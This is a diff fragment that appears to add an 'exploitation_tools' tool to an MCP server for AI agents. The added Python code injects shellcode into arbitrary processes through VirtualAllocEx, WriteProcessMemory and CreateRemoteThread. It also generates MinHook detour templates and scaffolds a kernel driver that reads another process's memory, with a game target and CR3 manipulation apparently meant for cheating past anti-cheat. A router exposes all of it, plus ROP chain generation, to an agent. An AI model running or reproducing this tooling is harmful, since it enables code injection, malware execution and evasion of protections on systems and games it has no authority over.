+        PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
+        MEM_COMMIT = 0x1000
+        MEM_RESERVE = 0x2000
+
+        kernel32 = ctypes.windll.kernel32
+        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+        if not h_process:
+            return {"error": f"Failed to open process {pid}. Error: {kernel32.GetLastError()}"}
+
+        arg_address = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+        if not arg_address:
+            return {"error": f"VirtualAllocEx failed. Error: {kernel32.GetLastError()}"}
+
+        written = ctypes.c_int(0)
+        kernel32.WriteProcessMemory(h_process, arg_address, shellcode, len(shellcode), ctypes.byref(written))
+
+        if technique.lower() == "createremotethread":
+            thread_id = ctypes.c_ulong(0)
+            h_thread = kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, ctypes.byref(thread_id))
+            if not h_thread:
+                return {"error": f"CreateRemoteThread failed. Error: {kernel32.GetLastError()}"}
+            return {"status": "success", "pid": pid, "injected_bytes": len(shellcode), "address": hex(arg_address), "thread_id": thread_id.value}
+        
+        elif technique.lower() == "apc":
+            return {"error": "APC Injection requires enumerating threads. Use createremotethread for now."}
+            
+        return {"error": "Unknown injection technique."}
+    except Exception as e:
+        return handle_error(e)
+
+def generate_detour_hook(session_id: str, address: str, convention: str = "__fastcall", proto: str = "void* rcx") -> Any:
+    """Generates a ready-to-compile C++ MinHook template for the specified function."""
+    addr_clean = address.replace('0x', '')
+    hook_name = f"hk_Function_{addr_clean}"
+    orig_name = f"o_Function_{addr_clean}"
+    
+    template = f"""
+#include <MinHook.h>
+#include <iostream>
+
+// Typedef for original function
+typedef void* ({convention} *t{hook_name})({proto});
+t{hook_name} {orig_name} = nullptr;
+
+// Detour function
+void* {convention} {hook_name}({proto}) {{
+    // Add your custom logic here
+    // Example: printf("Hook called!\\n");
+    
+    // Call original
+    return {orig_name}(/* args */);
+}}
+
+void InitializeHook() {{
+    if (MH_Initialize() != MH_OK) return;
+    
+    uintptr_t targetAddr = {address};
+    if (MH_CreateHook((void*)targetAddr, &{hook_name}, reinterpret_cast<void**>(&{orig_name})) != MH_OK) return;
+    if (MH_EnableHook((void*)targetAddr) != MH_OK) return;
+}}
+"""
+    return {"cpp_hook": template, "address": address}
+
+def scaffold_kernel_interface(game_name: str, with_cr3: bool = True) -> Any:
+    """Generate a functional WDM IOCTL Kernel Driver scaffold with physical memory read/write and CR3 manipulation."""
+    
+    cr3_code = "// CR3 manipulation omitted"
+    if with_cr3:
+        cr3_code = """
+ULONG_PTR GetProcessCr3(PEPROCESS Process) {
+    // Offset for DirectoryTableBase usually 0x28 on x64
+    return *(ULONG_PTR*)((PUCHAR)Process + 0x28);
+}
+// Switch CR3 context to target before MmCopyMemory
+"""
+
+    template = f"""
+#include <ntifs.h>
+#include <windef.h>
+
+#define IOCTL_READ_MEMORY CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+typedef struct _MEMORY_REQUEST {{
+    ULONG ProcessId;
+    ULONG_PTR Address;
+    ULONG_PTR Buffer;
+    SIZE_T Size;
+}} MEMORY_REQUEST, *PMEMORY_REQUEST;
+
+{cr3_code}
+
+NTSTATUS ReadPhysicalMemory(PEPROCESS TargetProcess, PVOID SourceAddress, PVOID TargetAddress, SIZE_T Size) {{
+    SIZE_T Bytes;
+    return MmCopyVirtualMemory(TargetProcess, SourceAddress, PsGetCurrentProcess(), TargetAddress, Size, KernelMode, &Bytes);
+}}
+
+NTSTATUS IoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {{
+    UNREFERENCED_PARAMETER(DeviceObject);
+    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
+    NTSTATUS status = STATUS_SUCCESS;
+    
+    if (stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_READ_MEMORY) {{
+        PMEMORY_REQUEST req = (PMEMORY_REQUEST)Irp->AssociatedIrp.SystemBuffer;
+        PEPROCESS process;
+        if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)req->ProcessId, &process))) {{
+            ReadPhysicalMemory(process, (PVOID)req->Address, (PVOID)req->Buffer, req->Size);
+            ObDereferenceObject(process);
+        }}
+    }}
+    Irp->IoStatus.Status = status;
+    IoCompleteRequest(Irp, IO_NO_INCREMENT);
+    return status;
+}}
+"""
+    return {"driver_cpp": template, "game": game_name, "cr3_bypasses": with_cr3}
+
+@mcp.tool()
+@audit_log
+async def exploitation_tools(
+    action: Literal["inject_shellcode", "generate_detour_hook", "generate_rop_chain", "scaffold_kernel_interface"],
+    session_id: str = None, pid: int = 0, shellcode_hex: str = "", technique: str = "createremotethread",
+    address: str = "", convention: str = "__fastcall", proto: str = "void* rcx", game_name: str = "Target", with_cr3: bool = True
+) -> Any:
+    """Consolidated router for advanced exploitation, process injection, hooking, and kernel driver generation."""
+    if action == "inject_shellcode": return inject_shellcode(pid, shellcode_hex, technique)
+    elif action == "generate_detour_hook": return generate_detour_hook(session_id, address, convention, proto)
+    elif action == "generate_rop_chain": return await generate_rop_chain(session_id, address, 1000)
+    elif action == "scaffold_kernel_interface": return scaffold_kernel_interface(game_name, with_cr3)
+
